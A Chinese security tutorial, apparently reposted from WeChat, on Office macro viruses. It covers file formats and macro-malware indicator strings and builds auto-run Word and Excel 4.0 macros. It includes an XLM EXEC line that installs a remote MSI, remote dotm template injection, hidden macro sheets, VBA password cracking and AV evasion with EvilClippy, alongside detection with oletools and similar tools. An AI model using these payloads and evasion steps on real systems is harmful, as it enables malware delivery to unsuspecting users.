> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hz3Hp8HnRUxvCxq-so0zCA)

**一、前言**
--------

**什么是宏？**

宏语言是一种特殊用途的命令语言， 在各个场景的形式不同，但是目的 都是通过自动化特定应用程序中的 某些序列，减少人工的重复操作。给使用者提供方便，提高效率  

<table width="677"><tbody><tr><td><p>文档宏</p></td><td><p>游戏宏</p></td></tr><tr><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqcXcvCK9iazK6kSl5EhyreZTZw9FqHncMicsp77r5OgGX3pHic5HQVswQw/640?wx_fmt=png&amp;wxfrom=13&amp;tp=wxpic"></p></td><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqcTviaVD3hjupovSOL7oALQEub3pHQBoymqLPHygyXOtpAuQ6zEQGtgA/640?wx_fmt=png&amp;wxfrom=13&amp;tp=wxpic"></p></td></tr></tbody></table>

**什么是宏病毒？**

宏病毒，即 VBA 语言嵌入在 WORD 模板中的病毒，一般为伪装为具有诱导力的文件名引诱受害者打开，并执行内置的宏脚本。

宏病毒中常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如 Sub botton(), 当用户单击文档中的按钮控件时，宏自动执行；另一种则是 Auto 自动执行，如 Sub AutoOpen() 和 Sub AutoClose()，分别在文档打开和关闭时自动执行。

### 1、文件格式

以 office 为例，Office 2007 和 Office  2003 以及之前版本保存的文档格式是不同的。

1、Office 2003 版本及之前

```
格式为doc,xls等

```

2、Office 2007 及以上版本格式新增了 4 种格式的后缀

```
.docx——不包含宏的普通文档
.docm——包含宏或启用了宏的文档
.dotx——不包含宏的模板
.dotm——包含宏或启用了宏的模板

```

相对于 Word 2003 来说，Office 2007 除了性能的的提升，也提升了一定的安全性。

doc（doc、.ppt、.xls）文件是一种普通的 OLE 文件 (复合文件，所有文件数据都是存储在一个或多个流中)，能够包含宏。

微软推出了以 x 结尾 (**docx**) 和以 m 结尾 (**docm**) 的两大类文档文件，这两类文件均是 OpenXML 文件，微软在传统的文件名扩展名后面添加了字母 “x”（即 docx 取代 doc、xlsx 取代 xls、pptx 取代 ppt)。

微软将所有宏相关的内容都放进了 **vbaProject.bin** 文件中，一般来说，**只要文件中不包含 vbaProject.bin，就不可能含有宏，也就不可能是宏病毒。**虽然以 “x” 结尾的文件中不含有 vbaProject.bin，但是可能被**远程 docm 注入宏病毒**

### 2、EXCEL 格式简单说明

**1、兼容格式：.xls**

从 Excel 2007 开始，微软公司推出了新的文件格式，但是为了保持文件的兼容性仍然允许用户使用老版本的. xls 格式，因此在高版本的 Excel 中也把. xls 称之为兼容格式。**.xls 格式可以保存宏代码**。

将文件保存为. xls 格式，文件发送给低版本的用户后也可以正常打开，**缺点是会丢失高版本的某些特性**，例如 65536 行以上的行数、256 列以上的列数、超过 3 项以上的条件格式以及 Excel 新版本才有的函数等。

**2、压缩格式：.xlsx（无宏）**

从 Excel 2007 开始，微软推出了压缩格式. xlsx，将工作簿保存为压缩格式后可以应用更多的新功能，例如支持 1048576 行、16384 列、64 个条件格式等。之所以称之为压缩格式，是因为将工作簿保存为. xlsx 格式后其体积相较于. xls 会大大缩小。其缺点是**不能保存宏代码**，且**只有 Excel 2007 或以上的版本才能打开**。

**3、启用宏的压缩格式：.xlsm（有宏）**

在推出. xlsx 格式的同时，微软也推出了 xlsm 格式，它即拥有. xlsx 格式的一切优势，又能弥补. xlsx 格式的不足 --.xlsx 格式不能保存宏代码，而. xlsm 格式可以保存宏代码。

**4、二进制工作簿：.xlsb（有宏）**

xlsb 和. xlsx、.xlsm 文件格式基本类似，它们都是压缩文件包（将后缀改为 zip 即可解压），区别在于. xlsx 和. xlsm 的压缩包里面的内容都是基于 XML（文本，可以直接用写字板打开阅读），而. xlsb 压缩包里的内容则是二进制文件（无法直接打开阅读）。

**5、Excel 模板：.xltx**

Excel 模板默认的文件格式，不能存储 VBA 宏代码或 Excel 4.0 宏工作表 (.xlm)。

**6、启用宏的 Excel 模板：.xltm**

Excel 模板，启用宏的模板文件格式。可以存储 VBA 宏代码或 Excel 4.0 宏工作表 (.xlm)。

**7、Excel 加载宏：.xlam**

Excel 加载宏，类似于游戏中的外挂插件，可以强化 Excel 的功能，.xlam 是 Excel 基于 XML 和启用宏的加载宏格式，支持使用 VBA 项目和 Excel 4.0 宏工作表 (.xlm)。

### 3、DOCX

记得不要使用 WPS 右击创建 DOCX 文件，而是使用 office word 创建 DOCX 才是标准的。

将 docx.docx 文件的文件名修改为 docx.zip 就可以以压缩包的形式打开. docx 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqhDZcu72bQJ4yRl6icZsHgukLicFvADY6upY4KnPWd7kzJ4Hg5ro9soMg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

```
document.xml：记录Word文档的正文内容
footer*.xml：记录Word文档的页脚
header*.xml：记录Word文档的页眉
comments.xml：记录Word文档的批注
footnotes.xml：记录Word文档的脚注
endnotes.xml：记录Word文档的尾注

```

doc 文件结构

```
Header（文件头 512字节）：记录着文件解析必须的所有参数
Sector（扇区）：实际数据存储的地方，复合文档中数据都是以扇区为单位进行存储的。扇区内存储的数据种类有Stroage、Stream、Directory、FAT、Mini-FAT（属于Mini-Sector）、DIF等，但每个扇区中只能存储一种数据类型。每个Sector都有一个SectorID，但是Header所在的扇区ID是-1，并不是0。Header后的Sector才是“第一个”Sector，其SectorID为0。
Sector：一般是512字节
Mini-Sector：64字节
Storage与Stream的功能相当于文件系统中的文件夹与文件的功能。Storage中是没有任何“实质性”的内容的，只会记录其包含的Stream和Storage，是一个Stream和Storage的目录。“实质性”的内容全在Stream里面。
Directory是一个Storage和Stream的索引。这一部分存储空间是用来记录Storage和Stream的存储结构以及名称、大小、起始地址等信息。
FAT：索引表。数据在硬盘上的存储是离散的，需要有一个索引表能找到这些数据，索引表中存放着数据的起始地址（即扇区的），索引中一般还有一条数据指向下一条索引，类似于链表。FAT实际记录了该扇区指向的下一个扇区的地址。
DIFAT：分区表，是FAT的索引表。FAT也是存储在Sector里面，但是FAT本身也比较大，所以利用DIFAT作为FAT的索引表，记录了FAT所在的Sector的起始地址以及逻辑关系。

```

*   docx 文档结构
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq9aXiaqV7njProjzcibUK6EK7sCW40oNR5lRGHVlicic3EKzs8ONfxaTthg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1) ![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqB0Vzhz6DESOGdMLHChQgwseUU3IJbN1lyvM6ic1sq22lC3YzicR0Tvag/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

### 4、宏病毒的字符串分析

1）宏病毒采取的隐蔽执行的一些措施  

<table width="677"><tbody><tr><td><p>On Error Resume Next</p></td><td><p>如何发生错误，不弹出错误对话框</p></td></tr><tr><td><p>Application.DisplayStatusBar = False</p></td><td><p>不显示状态栏，避免显示宏运行状态</p></td></tr><tr><td><p>Options.SaveNormalPrompt = False</p></td><td><p>修改共用模板时后台自动保存，不提示</p></td></tr><tr><td><p>EnableCancelKeY = &nbsp;wdCancelDisabled</p></td><td><p>不可以使用 ESC 取消正在执行的宏</p></td></tr><tr><td><p>Application.ScreenUpdating = 0</p></td><td><p>不让 Excel 弹出报警</p></td></tr><tr><td><p>CommandBars("Tools").Contrils("Macro").Enable=0</p></td><td><p>屏蔽工作菜单中 "宏" 按钮</p></td></tr><tr><td><p>CommandBars("Macro").Contrils("Security").Enable=0</p></td><td><p>屏蔽宏菜单中 "安全性" 按钮</p></td></tr><tr><td><p>CommandBars("Macro").Contrils("Macros").Enable=0</p></td><td><p>屏蔽宏菜单的 "宏"</p></td></tr><tr><td><p>CommandBars("Tools").Contrils("Customize").Enable=0</p></td><td><p>凭据工具菜单中 "自定义"</p></td></tr><tr><td><p>CommandBars("View").Contrils("Toolbars").Enable=0</p></td><td><p>屏蔽视图宏菜单中 "工具栏"</p></td></tr><tr><td><p>CommandBars("format").Contrils("Object").Enable=0</p></td><td><p>屏蔽格式菜单中 "对象"</p></td></tr></tbody></table>

**2）调用 Win API 来实现更有效的攻击方式**

<table width="677"><tbody><tr><td><p>外部例程</p></td><td><p>介绍</p></td></tr><tr><td><p>MSXML2.ServerXMLHTTP</p></td><td><p>Xmlhttp 是一种浏览器对象， 可用于模拟 http 的 GET 和 POST 请求</p></td></tr><tr><td><p>Net.WebClient</p></td><td><p>提供网络服务</p></td></tr><tr><td><p>Adodb.Stream</p></td><td><p>Stream 流对象用于表示数据流。配合 XMLHTTP 服务使用 Stream 对象可以从网站上下载各种可执行程序</p></td></tr><tr><td><p>Wscript.shell</p></td><td><p>WScript.Shell 是 WshShell 对象的 ProgID，创建 WshShell 对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。</p></td></tr><tr><td><p>Poweshell</p></td><td><p>PowerShell.exe 是微软提供的一种命令行 shell 程序和脚本环境</p></td></tr><tr><td><p>Application.Run</p></td><td><p>调用该函数，可以运行. exe 文件</p></td></tr><tr><td><p>WMI</p></td><td><p>用户可以利用 WMI 管理计算机，在宏病毒中主要通过 winmgmts:\\.\root\CIMV2 隐藏启动进程</p></td></tr><tr><td><p>Shell.Application</p></td><td><p>能够执行 sehll 命令</p></td></tr></tbody></table>

**3）外部特例对应的字符串**

<table width="677"><tbody><tr><td><p>字符串</p></td><td><p>描述</p></td></tr><tr><td><p>http</p></td><td><p>URL 连接</p></td></tr><tr><td><p>CallByName</p></td><td><p>允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用 CallByName 执行危险函数</p></td></tr><tr><td><p>Powershell</p></td><td><p>可以执行脚本，运行. exe 文件，可以执行 base64 的命令</p></td></tr><tr><td><p>Winmgmts</p></td><td><p>WinMgmt.exe 是 Windows 管理服务，可以创建 windows 管理脚本</p></td></tr><tr><td><p>Wscript</p></td><td><p>可以执行脚本命令</p></td></tr><tr><td><p>Shell</p></td><td><p>可以执行脚本命令</p></td></tr><tr><td><p>Environment</p></td><td><p>宏病毒用于获取系统环境变量</p></td></tr><tr><td><p>Adodb.stream</p></td><td><p>用于处理二进制数据流或文本流</p></td></tr><tr><td><p>Savetofile</p></td><td><p>结合 Adodb.stream 用于文件修改后保存</p></td></tr><tr><td><p>MSXML2</p></td><td><p>能够启动网络服务</p></td></tr><tr><td><p>XMLHTTP</p></td><td><p>能够启动网络服务</p></td></tr><tr><td><p>Application.Run</p></td><td><p>可以运行. exe 文件</p></td></tr><tr><td><p>Download</p></td><td><p>文件下载</p></td></tr><tr><td><p>Write</p></td><td><p>文件写入</p></td></tr><tr><td><p>Get</p></td><td><p>http 中 get 请求</p></td></tr><tr><td><p>Post</p></td><td><p>http 中 post 请求</p></td></tr><tr><td><p>Response</p></td><td><p>http 中认识 response 回复</p></td></tr><tr><td><p>Net</p></td><td><p>网络服务</p></td></tr><tr><td><p>WebClient</p></td><td><p>网络服务</p></td></tr><tr><td><p>Temp</p></td><td><p>常被宏病毒用于获取临时文件夹</p></td></tr><tr><td><p>Process</p></td><td><p>启动进程</p></td></tr><tr><td><p>Cmd</p></td><td><p>执行控制台命令</p></td></tr><tr><td><p>createObject</p></td><td><p>宏病毒常用于创建进行危险行为的对象</p></td></tr><tr><td><p>Comspec</p></td><td><p>%ComSpec% 一般指向你 cmd.exe 的路径</p></td></tr></tbody></table>

**二、制作一个 office 宏病毒**
---------------------

1、wps office 启动宏的话需要多亿点点条件，就不多说了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq6ZLp9rhW3KmNgwiaGCCado5ZAYYgq3eRX0bVc6Ntg700PWTGSFGjrbw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqIIpo8U5bdqhJEVQMIC4eefHRRV5THib9cTG0bViaQBQQuFEVTgSWsQbA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2、office word 如下

自动宏

```
AutoOpen、AutoClose、AutoExec、AutoExit、AutoNew、 Document_Open、Document_Close、Document_New

```

```
Sub autoopen()
    MsgBox "Hello World!"
End Sub

```

doc 和 docm + ALT+F11，保存，退出重新打开

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqqXNlcNlTj14s6Buz7ViaGOf6546hhx2H8yraJPOrIJnb4w26NSGOXKA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

office word 下打开会提示这样，如果启用内容则成功执行 VBA 命令

<table width="677"><tbody><tr><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq3snwwtrlFIibdiaagCQftwVRKn3hYNaXpicibe7TOWRMwjr0aficWBLXBzg/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p></td><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqSsiaiahBicR4x8La8hnQe3gpuWpbiavGYBHTYuKJjGnYf4xq6yg2biauIXQ/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p></td></tr></tbody></table>

如果换成命令执行，则成功执行计算器

```
Sub autoopen()
    Dim oShell, cmd
    Set oShell = CreateObject("WSCript.shell")
    cmd = "calc.exe"
    Call oShell.exec(cmd)
End Sub

```

**三、MS4.0(制作一个 excel 宏病毒)**
---------------------------

自动宏

```
Auto_Open、Auto_Close、Auto_Activate、Auto_Deactivate、 Workbook_Open、Workbook_Open

```

### 1、制作过程

1）创建一个 xls 后缀的文件，sheet1 插入

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq2hx6eicNwC3lJzdpukTIHCv9srexrp0D899fcPGDbYBloEwNZFPotlQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2）测试代码，点击执行，就能够命令执行，弹出 calc 和 msg 消息

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqjoX8EBSHbgZkHyraYqXGsZ09ZHCCnhfgn0WWibFhmcOzsMeba36d4eQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

3）自动运行 Auto_open，，然后隐藏宏 1，保存后然后重新打开，此时宏就会自动触发

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqC3N1hWXkMvEYKJ4B0qkghjrfSzicLE5HdPJicJ8L8o9g7ibdpJ4fBSAEw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

4）之后只需将其替换成免杀命令即可

```
=EXEC("msiexec /q /i http://192.xxx.5.132/test.msi")
=HALT()

```

WPS 则提示如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqibLdhw2KG1htvof2tWJLgrrI1A93f0JpspfJ5jTAFR8r958NibewGSvw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq9PMSQz0OgicCPhibqmbplJJkSlXHROiaanSAKgtXwXQ0NAzvdXv9HCiaLA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

### 2、发现和隐藏

1）默认情况下，XLM——xlsm 后缀宏代码存储在 **xl\Macrosheets\** 文件夹下的 **Sheet1.xml** 中

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq0L5ibnAbwnAuibkq5DaYgd2ZQm7UVAg2c4ESIAHUwK0qIQAMwfYYIFYA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2）

浅隐藏：可以通过检查单元格是否有缺来判断，取消隐藏可以看到恶意宏代码

深隐藏：使用 010editor 修改隐藏程度

```
85 00往后数九个字节，这里的值应该是00 01 02中的其中一项。其中00 表示不隐藏，01表示浅隐藏（可通过鼠标右键取消隐藏） 02表示深度隐藏（无法在Excel中找到）
把深隐藏修改为浅隐藏就能又看到javascript

```

如下所示

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqia7mwQBOEvGDUicjsZ89ohL5hRYN9VWfGPbEEra9Ijk0mZe1FCxD8xdg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

修改成功之后，没有发现取消隐藏的地方了，说明的确进入了深隐藏。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZq3x1030BsCceicOic98rD3mic1R3CBiaNDcEbRtTE2yhys4lwgicCfWXtgQA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

**四、PPTX 恶意执行命令**
-----------------

如下，只需设置动作设计，当受害者点击放映 PPT 的时候，鼠标单机或者鼠标移动过 则会触发恶意命令

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqPsFqib3AicOIzbV2xaEjgNYQec0wyTWEyibr0ZP1bEKQdxiaTNuCickXR0Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqlL7IuBtaxm758565O43xRWU1nUiaKVckMtBysib7kE83KxeicH2RV1icLA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

**五、VBA 加密破解**
--------------

通常病毒制作者不想要其他人看到宏内容，往往会对工程进行加密，加密方式如下:

ALT+F11-VBA 工程 - 工具 - Project 属性 - 保护

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqWoiaicdL8n2ASpzSMicAj8OiacrQPFN3xL1TAwicH6YyewOa8v432GZibs7g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqcQ6kYVha3fZXOrEWba7ZO3SEbu19dtFJibuj3ZOVDxicMiboakF3PVKDA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

一般来说可以使用破解工具打开，如 VBA_Password_Bypasser 工具等

```
http://soft.360.cn/static/baoku/info_7_0/softinfo_102011086.html

```

当然也可以手动进行破解:

```
 https://blog.csdn.net/wangtiankuo/article/details/89520358

```

1、VBA_Password_Bypasser 破解

也不知道为啥，提示的都是 fail

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqDxyEOt1bTPlsRCuZ1XId91NRTofGvCvW7QPhVyw87OIvibnvxc2bwFQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2、手动破解

1）找到 DPB 修改为 DPX——一定要是 office 创建的文件，wps 创建的可能不标准。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqnIU44xTRUxeUHib4pVVUa7DeT65nibR0xk5ck3pFqdzmKDe3K2pKtiaRg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2）选择是

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqJt6yfFwib3olBGHnV0Yg2oCtgRqdicurFiaw7fkXNsOqYjNcBZHLzicXPw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

3、之后直接 ALT+F11 打开，VBA 代码直接出来了，如果没出来，就选择 Project->Project 属性 -> 保护，设置新的密码，然后重新打开。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqhsX6iaCXicIZj5FlnCNOOwjfH5knx6kricZTAUU8BjPTxBA9vhpLIYdNg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

**六、宏病毒识别**
-----------

VBA 在 Office 文档中以三种形式存在：

```
1.源代码: 宏模块的原始源代码，明文存储在vba模块流中；
2.P-Code: pcode区域存储的是Pcode伪代码，是VBA宏代码被VBA编辑器编译之后的代码；
3.ExeCodes: execode区域只有在pcode代码至少执行一次后才会出现，是pcode代码执行的痕迹；

```

Office 软件正常情况下只会执行源代码区域和 Pcode 区域的代码，执行哪里的代码取决于 Office 和 VBA 编辑器的版本。如果使用 Office 和 VBA 编辑器版本完全相同的 Office 软件打开并执行宏，这时候只会执行 Pcode 区域的代码；而如果使用的 Office 或 VBA 编辑器版本不同，则会执行源代码区域的代码并且不会更新 pcode 代码。

利用 Pcode，可以在很大的程度上绕过杀毒软件的检测，利用 EvilClippy 工具可以修改 vba 源代码并保留 Pcode 中的 CobaltStrike 宏代码。经测试，360、火绒均未检出，且能正常上线。项目地址：

```
https://github.com/outflanknl/EvilClippy。

```

oledump 没有识别出混淆后的宏病毒：

olevba 可以识别出该文件的 vba 源代码与 Pcode 不同：

#### 1、VBA 编辑器 - 记得用虚拟机打开

Office 软件自带 VBA 编辑器，可以使用快捷键 ALT+F11 打开，对宏代码进行动态调试。在遇到字符串混淆、字符串隐藏等技术的宏病毒的时候，利用 VBA 编辑器的动态调试功能可以方便地进行分析。

#### 2、oledump（辣鸡）

```
https://github.com/decalage2/oledump-contrib

```

oledump.py 是一个用于分析 OLE 文件（复合文件二进制格式）的程序，我们可以使用它提取文档中的宏代码。不过由于是 python2 编写的。

oledump 可以提取 OLE 中的宏代码。

python oledump.py -s  a  -v demo2.doc >demo2.txt

使用不大方便 - -，也不知道抽了什么风 装了一些依赖也打不开。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqEXb4I3QbFiaG5AxBB2aUFHsM6JMJC8SDicAOgwOasIPiaSeOZfJmZZbDA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 3、oletools

oletools 是一个用来分析 Microsoft OLE2 文件的工具包，可以分析微软的 Office 文档、Outlook 邮件信息等。

```
https://github.com/decalage2/oletools

```

也可以直接使用 pip  install oletools 进行安装

<table width="677"><tbody><tr><td colspan="2"><p><strong>oletools 是一个工具包，里面还有多种类型不同用途的分析工具，具体的工具有如下几种</strong></p></td></tr><tr><td><p>oleid</p></td><td><p>用于分析 OLE 文件以便检测是否具有恶意文件的基本特征</p></td></tr><tr><td><p>olevba</p></td><td><p>从 MS Office 文档 (OLE、OpenXML) 中提取和分析 VBA 宏代码</p></td></tr><tr><td><p>MacroRaptor</p></td><td><p>检测恶意 VBA 宏</p></td></tr><tr><td><p>msodde</p></td><td><p>从 MS Office 文档、RTF 和 CSV 中提取和检测 DDE/DDEAUTO 链接</p></td></tr><tr><td><p>pyxswf</p></td><td><p>从 MS Office 文档 (例如 WORD、Excel)、RTF 中检测、提取和分析嵌入的 Flash 对象 (SWF)</p></td></tr><tr><td><p>oleobj</p></td><td><p>从 OLE 文件中提取嵌入的对象</p></td></tr><tr><td><p>rtfobj</p></td><td><p>从 RTF 文件中提取嵌入的对象</p></td></tr></tbody></table>

olevba 是专门用于分析 office 宏的 python 脚本，能够解析 OLE 和 OpenXML 文件，静态分析检测 VBA 宏，并以明文提取宏代码。olevba 还可以对宏代码进行分析，找到宏病毒特征关键字、反沙箱和反虚拟化技术使用的关键字。

这里以自己本地做的一个执行 calc 命令的 doc 宏作为演示。

**olevba** 

```
olevba  -a     xxx.doc

```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqVJ1OE6hZ3iaaT9VbazBtOcofCM51hkbANlZwKqgibzaJpQmy2pmicZR0A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

```
olevba  -c     xxx.doc

```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqat8SeyOVC6SEVtEZrYbdIlcw5Sz8Zmd1iaCLqnHreiaobdmkia6JiauElg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 4、pcodedmp

```
https://github.com/bontchev/pcodedmp

```

pcodedmp 可以提取 P-Code 代码，类似反编译后的效果。

```
python3 pcodedmp.py -d C:\Users\Administrator\Desktop\word\Doc1.doc

```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqBL9K4Igv2km1Cd4pMyLY8h7yRljsJk5egVVuIM3GwSeZtf3j0J6CAw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 5、OfficeMalScanner

```
https://github.com/fboldewin/reconstructer.org

```

officemalscanner 是 MS Office 的取证工具扫描恶意的痕迹，就像 shellcode 的启发式，PE 文件或嵌入的 OLE 流。它支持拆卸和 hexview 以及一个简单的蛮力的方式检测加密的文件。除此之外，正在扫描一个 Office 文件以获取 VB 宏代码 。是一个非常古老的提取工具了  
使用方法:

```
OfficeMalScanner   C:\Users\Administrator\Desktop\word\Doc1.doc info  

```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqKiblbczr87WhQqtwPMNgumYk9pN551dIviasLNkomkibnBVIbR5fwI3aw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

**七、远程 docx 模板加载 dotm**
-----------------------

docx 格式的文件不能包含宏，但是可以加载远程的 Word 模板（dotm），只要在 dotm 中嵌入恶意宏代码，就可以达成执行宏的目的。

**利用 settings.xml.rels 远程执行宏病毒**：在 **rels 文件 Relationship 标签**中，**Target** 表示零件的文件位置，正常情况下，给值是相对路径，且存在于压缩包中。通过恶意构造 Target，使其执行远程文件，就可以打开远程文件。解压 docx 文件，修改 word/_rels-settings.xml.rels 中的 target 为自己的 dotm 地址。实际测试的时候发现远程加载花的时间会比较久。

1、利用 office word 创建一个 docx 文件，修改后缀为 zip，解压

（注意坑点，注意坑点！这里我是选择原有的模板去修改的，修改为 zip 解压后会存在 settings.xml.rels，如果是创建空白的话则没有 settings.xml.rels 文件，而我自己添加了 settings.xml.rels 文件，之后进行修改后怎么也触发不了 dotm 文件。而用它这个模板解压后直接修改，就可以了，我也不知道为什么，但是这里踩了很久的坑，所以建议还是用它的模板去修改吧。）

<table width="677"><tbody><tr><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqZnrB9uU52ENrTF1uxib9JJRP8qspRMbbOzA2yIAXc5lt7HcRJWU6bXA/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p></td><td><p><img class="" src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqTCKW5CBibriaib8jnuRHHPlQw4FNdHKY77tH6SwcOTtYXvxqhEb1uTPww/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p></td></tr></tbody></table>

修改 settings.xml.rels 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqab6GCVTnEfpl2OOqF4O5icIIfwBcR5Hap89CUGmibcRN3iaibUXhibhrcwg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
Target="http://192.168.2.101:1111/Doc1.dotm"
TargetMode="External"/>
</Relationships>

```

压缩还原成 docx 文件后打开，如果启用宏那么就执行 dotm 文件，就成功上线了。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqJtPjrH7oia6ibDM4HP7t1HtgXcNSZqEm0zsF2FlcOrhSXLr7eJf7njkQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibUdvicwiaoiatVDuXpCibiblMZqjBVJN20Fn5yM9RbkBhzKC6AXyYOxpCdnqt8qqHia0GoSCeGyv5KrjWQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2、利用 webSetings.xml.rels 窃取 NTLM hash（Word 模板注入攻击）

```
https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/

```

